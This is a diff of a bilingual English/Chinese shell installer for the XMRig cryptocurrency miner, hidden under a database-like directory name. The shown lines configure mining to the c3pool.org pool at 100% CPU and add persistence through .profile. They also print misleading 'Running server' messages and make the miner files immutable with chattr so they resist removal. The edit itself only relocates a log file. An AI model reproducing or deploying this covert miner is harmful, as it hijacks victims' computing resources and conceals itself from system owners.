@@ -806,7 +806,7 @@ sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/myssqltcp/c
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/myssqltcp/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqltcp/myssqlsys.log'",#' $HOME/myssqltcp/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
 
 cp $HOME/myssqltcp/config.json $HOME/myssqltcp/config_background.json
@@ -841,8 +841,8 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
 	echo "脚本 $HOME/myssqltcp/xmrig.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
-  echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
+  echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
+  echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqlsys.log 日志文件)"
   /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
@@ -855,8 +855,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running server in the background (see logs in $HOME/myssqltcp/myssqlsys.log file)"
-	echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqltcp/myssqlsys.log 日志文件)"
+    echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
+	echo "[*] 已在后台运行myssqlsys (请查看 $HOME/myssqlsys.log 日志文件)"
     /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup server activation after reboot yourself if possible."
@@ -911,7 +911,6 @@ chattr -V +iau $HOME/myssqltcp/xmrig
 chattr -V +iau $HOME/myssqltcp/config_background.json
 chattr -V +iau $HOME/myssqltcp/config.json
 chattr -V +iau $HOME/myssqltcp/xmrig.sh
-chattr -V -iau $HOME/myssqltcp/myssqlsys.log
 
 echo "[*] Setup complete"
 echo "[*] 安装完成"
